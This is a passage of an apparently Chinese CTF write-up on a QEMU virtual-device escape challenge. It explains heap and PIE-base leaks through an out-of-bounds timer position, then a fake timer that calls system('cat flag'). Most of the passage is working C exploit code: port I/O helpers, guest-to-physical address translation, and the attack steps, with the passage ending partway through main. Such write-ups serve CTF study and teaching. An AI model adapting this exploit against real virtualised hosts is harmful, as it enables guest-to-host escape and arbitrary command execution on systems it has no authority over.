<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"checker = %#lx\n"</span><span class="token punctuation">,</span> <span class="token function">get_checker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="Leak-Heap-Address"><a href="#Leak-Heap-Address" class="headerlink" title="Leak Heap Address"></a>Leak Heap Address</h3><p>可以控制 checker 后，就可以随意多次触发 timer 了，接着下面的步 leak heap</p>
<ol>
<li>触发 timer，pos+=0x10，使其越界到 req_addr 指针的位置</li>
<li>reader，读出 req_addr 指针</li>
</ol>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] pos += 0x10"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>cmd <span class="token operator">=</span> TIMER<span class="token punctuation">;</span>
req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x10</span><span class="token punctuation">;</span>
req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pos = %#lx\n"</span><span class="token punctuation">,</span> <span class="token function">get_pos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] reset cache_addr"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// cache_addr/req_addr</span>
<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>cmd <span class="token operator">=</span> TIMER<span class="token punctuation">;</span>
req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pos = %#lx\n"</span><span class="token punctuation">,</span> <span class="token function">get_pos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0x310</span>

<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] reading data  ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// leak &amp;request</span>
<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
req<span class="token punctuation">.</span>reader<span class="token punctuation">.</span>cmd <span class="token operator">=</span> READ<span class="token punctuation">;</span>
req<span class="token punctuation">.</span>reader<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x310</span><span class="token punctuation">;</span>
req<span class="token punctuation">.</span>reader<span class="token punctuation">.</span>ptr <span class="token operator">=</span> <span class="token function">gva_to_gpa</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

heap <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x308</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
timer_ptr <span class="token operator">=</span> heap <span class="token operator">+</span> <span class="token number">0x12b8</span><span class="token punctuation">;</span>
timer_list_ptr <span class="token operator">=</span> heap <span class="token operator">-</span> <span class="token number">0x110e8c8</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"heap address: %#lx\n"</span><span class="token punctuation">,</span> heap<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"timer_ptr: %#lx\n"</span><span class="token punctuation">,</span> timer_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"timer_list_ptr: %#lx\n"</span><span class="token punctuation">,</span> timer_list_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="Leak-Code-Base"><a href="#Leak-Code-Base" class="headerlink" title="Leak Code Base"></a>Leak Code Base</h3><p>接下来要 bypass PIE，泄露程序基址</p>
<ol>
<li>此时 pos=0x310，给 timer 设置的触发延时长一点</li>
<li>利用 encoder 0x2022 功能，再 timer 触发前，修改 req_addr</li>
<li>timer 触发后，req_addr 已经被修改，再结合 reader 即可任意地址读</li>
</ol>
<p>修改 req_addr 为 timer 对象 +0x10 偏移处，这里就是回调函数指针 hfdev_func 的地方了，计算偏移可以找到 system plt 的位置：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] set time delay"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">set_time</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] trigger timer, pos+=8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>cmd <span class="token operator">=</span> TIMER<span class="token punctuation">;</span>
req<span class="token punctuation">.</span>timer<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>
<span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] modify cache_addr before timer runing"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>cmd <span class="token operator">=</span> ENC<span class="token punctuation">;</span>
req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>sub_cmd <span class="token operator">=</span> ENC2<span class="token punctuation">;</span>
req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x310</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>req<span class="token punctuation">.</span>encoder<span class="token punctuation">.</span>data<span class="token punctuation">[</span><span class="token number">0x308</span><span class="token punctuation">]</span> <span class="token operator">=</span> heap <span class="token operator">^</span> <span class="token punctuation">(</span>timer_ptr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"waiting for timer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// getchar();</span>

<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] reading data  ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// leak &amp;request</span>
<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
req<span class="token punctuation">.</span>reader<span class="token punctuation">.</span>cmd <span class="token operator">=</span> READ<span class="token punctuation">;</span>
req<span class="token punctuation">.</span>reader<span class="token punctuation">.</span>size <span class="token operator">=</span> <span class="token number">0x318</span><span class="token punctuation">;</span>
req<span class="token punctuation">.</span>reader<span class="token punctuation">.</span>ptr <span class="token operator">=</span> <span class="token function">gva_to_gpa</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

hfdev_func <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x310</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
cbase <span class="token operator">=</span> hfdev_func <span class="token operator">-</span> <span class="token number">0x381190</span><span class="token punctuation">;</span>
system <span class="token operator">=</span> cbase <span class="token operator">+</span> <span class="token number">0x2d6614</span><span class="token punctuation">;</span>
binsh <span class="token operator">=</span> cbase <span class="token operator">+</span> <span class="token number">0x869b82</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"hfdev_func = %#lx\n"</span><span class="token punctuation">,</span> hfdev_func<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"cbase = %#lx\n"</span><span class="token punctuation">,</span> cbase<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"system = %#lx\n"</span><span class="token punctuation">,</span> system<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"binsh = %#lx\n"</span><span class="token punctuation">,</span> binsh<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="Hijack-Timer"><a href="#Hijack-Timer" class="headerlink" title="Hijack Timer"></a>Hijack Timer</h3><ol>
<li>Req 结构体上，构造 fake timer</li>
<li>此时 pos=0x318，使用 0x2022 功能修改 timer 指针指向 fake timer</li>
<li>触发 timer 执行 <code>system(&quot;cat flag&quot;)</code></li>
</ol>
<hr>
<h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><p>完整 exp 如下：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;errno.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;signal.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ctype.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;termios.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/io.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stddef.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stddef.h></span></span>
 
<span class="token class-name">uint16_t</span> pmio_base <span class="token operator">=</span> <span class="token number">0xc040</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> pagemap_fd<span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>packed<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token class-name">RequestRead</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">uint8_t</span> cmd<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> ptr<span class="token punctuation">;</span>
    <span class="token class-name">uint16_t</span> size<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>packed<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token class-name">RequestTimer</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">uint8_t</span> cmd<span class="token punctuation">;</span>
    <span class="token class-name">uint16_t</span> size<span class="token punctuation">;</span>
    <span class="token class-name">uint16_t</span> offset<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>packed<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token class-name">RequestEnc</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">uint8_t</span> cmd<span class="token punctuation">;</span>
    <span class="token class-name">uint8_t</span> add_key<span class="token punctuation">;</span>
    <span class="token class-name">uint8_t</span> xor_key<span class="token punctuation">;</span>
    <span class="token class-name">uint16_t</span> sub_cmd<span class="token punctuation">;</span>
    <span class="token class-name">uint16_t</span> size<span class="token punctuation">;</span>
    <span class="token class-name">uint8_t</span> data<span class="token punctuation">[</span><span class="token number">0x400</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

 
<span class="token keyword">void</span> <span class="token function">pmio_write</span><span class="token punctuation">(</span><span class="token class-name">uint16_t</span> addr<span class="token punctuation">,</span><span class="token class-name">uint32_t</span> val<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">outw</span><span class="token punctuation">(</span>val<span class="token punctuation">,</span> addr<span class="token operator">+</span>pmio_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
 
<span class="token class-name">uint64_t</span> <span class="token function">pmio_read</span><span class="token punctuation">(</span><span class="token class-name">uint16_t</span> addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">uint32_t</span><span class="token punctuation">)</span><span class="token function">inw</span><span class="token punctuation">(</span>addr<span class="token operator">+</span>pmio_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
 
 
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PAGE_SHIFT</span>  <span class="token expression"><span class="token number">12</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PAGE_SIZE</span>   <span class="token expression"><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> PAGE_SHIFT<span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PFN_PRESENT</span> <span class="token expression"><span class="token punctuation">(</span><span class="token number">1ull</span> <span class="token operator">&lt;&lt;</span> <span class="token number">63</span><span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PFN_PFN</span>     <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1ull</span> <span class="token operator">&lt;&lt;</span> <span class="token number">55</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span></span></span>

<span class="token class-name">uint32_t</span> <span class="token function">page_offset</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span> addr<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> addr <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> PAGE_SHIFT<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token class-name">uint64_t</span> <span class="token function">gva_to_gfn</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>addr<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token class-name">uint64_t</span> pme<span class="token punctuation">,</span> gfn<span class="token punctuation">;</span>
    <span class="token class-name">size_t</span> offset<span class="token punctuation">;</span>
    offset <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uintptr_t</span><span class="token punctuation">)</span>addr <span class="token operator">>></span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token number">7</span><span class="token punctuation">;</span>
    <span class="token function">lseek</span><span class="token punctuation">(</span>pagemap_fd<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> <span class="token constant">SEEK_SET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span>pagemap_fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pme<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>pme <span class="token operator">&amp;</span> PFN_PRESENT<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    gfn <span class="token operator">=</span> pme <span class="token operator">&amp;</span> PFN_PFN<span class="token punctuation">;</span>
    <span class="token keyword">return</span> gfn<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token class-name">uint64_t</span> <span class="token function">gva_to_gpa</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>addr<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token class-name">uint64_t</span> gfn <span class="token operator">=</span> <span class="token function">gva_to_gfn</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">assert</span><span class="token punctuation">(</span>gfn <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>gfn <span class="token operator">&lt;&lt;</span> PAGE_SHIFT<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">page_offset</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">set_phy_addr</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span> vaddr<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token class-name">uint64_t</span> paddr <span class="token operator">=</span> <span class="token function">gva_to_gpa</span><span class="token punctuation">(</span>vaddr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">pmio_write</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> paddr <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">pmio_write</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> paddr <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">set_request_size</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span> size<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token function">pmio_write</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token function">pmio_write</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">set_time</span><span class="token punctuation">(</span><span class="token class-name">uint32_t</span> time<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token function">pmio_write</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> time<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token class-name">uint64_t</span> <span class="token function">get_pos</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">pmio_read</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token class-name">uint64_t</span> <span class="token function">get_checker</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">pmio_read</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">trigger_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token function">pmio_write</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ENC</span> <span class="token expression"><span class="token number">0x10</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">READ</span> <span class="token expression"><span class="token number">0x20</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">TIMER</span> <span class="token expression"><span class="token number">0x30</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ENC1</span> <span class="token expression"><span class="token number">0x2202</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ENC2</span> <span class="token expression"><span class="token number">0x2022</span></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x400</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">union</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">struct</span> <span class="token class-name">RequestEnc</span> encoder<span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">RequestRead</span> reader<span class="token punctuation">;</span>
        <span class="token keyword">struct</span> <span class="token class-name">RequestTimer</span> timer<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> req<span class="token punctuation">;</span>

    <span class="token class-name">uint64_t</span> heap<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> timer_ptr<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> timer_list_ptr<span class="token punctuation">;</span>

    <span class="token class-name">uint64_t</span> hfdev_func<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> cbase<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> system<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> binsh<span class="token punctuation">;</span>
    <span class="token class-name">uint64_t</span> <span class="token operator">*</span>fake_timer_ptr<span class="token punctuation">;</span>

    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    pagemap_fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/pagemap"</span><span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>pagemap_fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open pagemap"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">iopl</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">!=</span><span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"iopl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">set_phy_addr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>req<span class="token punctuation">)</span><span class="token punctuation">;</span>
